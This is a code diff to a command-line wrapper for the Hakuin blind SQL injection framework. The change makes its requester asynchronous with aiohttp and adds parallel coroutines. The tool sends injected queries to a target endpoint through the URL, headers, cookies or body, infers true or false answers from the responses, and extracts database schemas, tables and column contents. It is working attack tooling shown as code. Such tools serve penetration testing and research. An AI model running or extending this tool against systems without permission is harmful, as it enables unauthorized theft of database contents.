@@ -1,9 +1,12 @@
 import argparse
+import asyncio
 import json
 import logging
 import re
 import requests
 import sys
+
+import aiohttp
 
 from hakuin.dbms import SQLite, MySQL, MSSQL, PSQL
 from hakuin import Extractor, Requester
@@ -21,7 +24,8 @@ class UniversalRequester(Requester):
     RE_QUERY_TAG = re.compile(r'{query}')
 
 
-    def __init__(self, args):
+    def __init__(self, http, args):
+        self.http = http
         self.url = args.url
         self.method = args.method
         self.headers = self._process_dict(args.headers)
@@ -30,6 +34,11 @@ class UniversalRequester(Requester):
         self.inference = self._process_inference(args.inference)
         self.dbg = args.dbg
         self.n_requests = 0
+
+
+    @staticmethod
+    async def _init_http():
+        return aiohttp.ClientSession()
 
 
     def _process_dict(self, dict_str):
@@ -58,7 +67,7 @@ class UniversalRequester(Requester):
         return inf
 
 
-    def request(self, ctx, query):
+    async def request(self, ctx, query):
         self.n_requests += 1
 
         url = self.RE_QUERY_TAG.sub(requests.utils.quote(query), self.url)
@@ -66,20 +75,20 @@ class UniversalRequester(Requester):
         cookies = {self.RE_QUERY_TAG.sub(query, k): self.RE_QUERY_TAG.sub(query, v) for k, v in self.cookies.items()}
         body = self.RE_QUERY_TAG.sub(query, self.body) if self.body else None
 
-        resp = requests.request(method=self.method, url=url, headers=headers, cookies=cookies, data=body)
-
-        if self.inference['type'] == 'status':
-            result = resp.status_code == self.inference['content']
-        elif self.inference['type'] == 'header':
-            result = any(self.inference['content'] in v for v in resp.headers.keys() + resp.headers.values())
-        elif self.inference['type'] == 'body':
-            result = self.inference['content'] in resp.content.decode()
+        async with self.http.request(method=self.method, url=url, headers=headers, cookies=cookies, data=body) as resp:
+            if self.inference['type'] == 'status':
+                result = resp.status == self.inference['content']
+            elif self.inference['type'] == 'header':
+                result = any(self.inference['content'] in v for v in resp.headers.keys() + resp.headers.values())
+            elif self.inference['type'] == 'body':
+                content = await resp.text()
+                result = self.inference['content'] in content
 
         if self.inference['is_negated']:
             result = not result
 
         if self.dbg:
-            print(result, '(err)' if resp.status_code == 500 else '',  query, file=sys.stderr)
+            print(result, '(err)' if resp.status == 500 else '',  query, file=sys.stderr)
 
         return result
 
@@ -94,40 +103,50 @@ class HK:
     }
 
 
-    def __init__(self, args):
-        requester = UniversalRequester(args)
-        dbms = self.DBMS_DICT[args.dbms]()
-        self.ext = Extractor(requester, dbms)
+    def __init__(self):
+        self.ext = None
 
 
-    def main(self, args):
+    async def main(self, args):
+        async with aiohttp.ClientSession() as http:
+            requester = UniversalRequester(http, args)
+            dbms = self.DBMS_DICT[args.dbms]()
+            self.ext = Extractor(requester, dbms, args.threads)
+
+            await self._main(args)
+
+
+    async def _main(self, args):
+
         if args.schema:
-            res = self.ext.extract_schema(strategy=args.schema_strategy)
+            res = await self.ext.extract_schema(strategy=args.schema_strategy)
         elif args.column:
-            res = self.ext.extract_column(table=args.table, column=args.column, text_strategy=args.text_strategy)
+            res = await self.ext.extract_column(table=args.table, column=args.column, text_strategy=args.text_strategy)
         elif args.table:
-            res = self.extract_table(table=args.table, schema_strategy=args.schema_strategy, text_strategy=args.text_strategy)
+            res = await self.extract_table(table=args.table, schema_strategy=args.schema_strategy, text_strategy=args.text_strategy)
         else:
-            res = self.extract_tables(schema_strategy=args.schema_strategy, text_strategy=args.text_strategy)
+            res = await self.extract_tables(schema_strategy=args.schema_strategy, text_strategy=args.text_strategy)
 
         print(f'Number of requests: {self.ext.requester.n_requests}')
         print(json.dumps(res, cls=BytesEncoder, indent=4))
 
 
-    def extract_schema(self):
-        return self.ext.extract_schema(strategy=self.args.schema_strategy)
+    async def extract_schema(self):
+        return await self.ext.extract_schema(strategy=self.args.schema_strategy)
 
-    def extract_tables(self, schema_strategy, text_strategy):
+
+    async def extract_tables(self, schema_strategy, text_strategy):
         res = {}
-        for table in self.ext.extract_table_names(strategy=schema_strategy):
-            res[table] = self.extract_table(table, schema_strategy, text_strategy)
+        for table in await self.ext.extract_table_names(strategy=schema_strategy):
+            res[table] = await self.extract_table(table, schema_strategy, text_strategy)
         return res
 
-    def extract_table(self, table, schema_strategy, text_strategy):
+
+    async def extract_table(self, table, schema_strategy, text_strategy):
         res = {}
-        for column in self.ext.extract_column_names(table=table, strategy=schema_strategy):
+        for column in await self.ext.extract_column_names(table=table, strategy=schema_strategy):
             try:
-                res[column] = self.ext.extract_column(table=table, column=column, text_strategy=text_strategy)
+                res[column] = await self.ext.extract_column(table=table, column=column, text_strategy=text_strategy)
             except Exception as e:
                 logging.error(f'Failed to extract "{table}.{column}": {e}')
         return res
@@ -137,6 +156,7 @@ class HK:
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='A simple wrapper to easily call Hakuin\'s basic functionality.')
     parser.add_argument('url', help='URL pointing to a vulnerable endpoint. The URL can contain the {query} tag, which will be replaced with injected queries.')
+    parser.add_argument('-T', '--threads', default=1, type=int, help='Run several coroutines in parallel.')
     parser.add_argument('-d', '--dbms', required=True, choices=HK.DBMS_DICT.keys(), help='Assume this DBMS engine.')
     parser.add_argument('-M', '--method', choices=['get', 'post', 'put', 'delete', 'head', 'patch'], default='get', help='HTTP request method.')
     parser.add_argument('-H', '--headers', help='Headers attached to requests. The header names and values can contain the {query} tag.')
@@ -164,5 +184,7 @@ if __name__ == '__main__':
     if args.column:
         assert args.table, 'You must specify --table when using --column.'
 
+    assert args.threads > 0, 'The --threads parameter must be possitive.'
+
     logging.basicConfig(level=logging.INFO)
-    HK(args).main(args)
+    asyncio.get_event_loop().run_until_complete(HK().main(args))
